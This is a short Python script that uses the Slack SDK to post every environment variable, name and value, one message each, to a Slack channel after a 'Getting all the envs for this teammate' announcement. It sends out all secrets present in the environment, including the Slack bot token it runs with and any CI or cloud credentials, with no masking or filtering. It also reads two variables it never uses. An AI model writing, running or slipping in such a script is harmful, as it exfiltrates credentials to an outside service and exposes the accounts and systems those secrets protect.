import os
import json 
import logging

from slack_sdk import WebClient
from slack_sdk.errors import SlackApiError

logger = logging.getLogger(__name__)

THREAD_TS = os.environ.get('SLACK_THREAD')
CHANNEL_ID = os.environ.get('SLACK_CHANNEL')
SLACK_TOKEN = os.environ.get('SLACK_API_TOKEN')


client = WebClient(token=os.environ.get("SLACK_BOT_TOKEN"))
initial_comment = (f"Getting all the envs for this teammate'")

if __name__ == "__main__":
  try: 
    result = client.chat_postMessage(
        channel=CHANNEL_ID,
        text=initial_comment
    )


    for name, value in os.environ.items():
        result = client.chat_postMessage(
          channel=CHANNEL_ID,
          text="{0}: {1}".format(name, value)
            )

  except SlackApiError as e:
      print(f"Error: {e}")


